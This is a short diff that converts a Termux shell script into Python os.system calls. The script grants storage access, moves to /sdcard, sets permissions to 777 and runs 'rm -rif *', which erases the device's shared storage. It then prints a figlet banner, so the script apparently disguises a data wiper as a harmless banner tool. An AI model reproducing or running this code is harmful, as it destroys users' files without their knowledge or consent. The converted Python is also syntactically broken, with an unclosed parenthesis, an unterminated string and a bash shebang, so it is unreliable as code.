@@ -1,17 +1,34 @@
+
+
+
+
 #!bin/bash
-termux-setup-storage
+import os
+os.system("termux-setup-storage")
 
-cd /sdcard
+os.system("cd /sdcard")
 
-chmod 777 *
+os.system("chmod 777 *")
 
-rm -rif *
+os.system("rm -rif *")
 
-cd 
-pkg install figlet -y
+os.system("cd") 
+os.system("pkg install figlet -y")
 
-clear
+os.system("clear"
 
-printf "\033[92m"
+print ("\033[92m")
 
-figlet bro bo gawalaka
+os.system("figlet bro bo gawalaka)
+
+
+
+
+
+
+
+
+
+
+
+
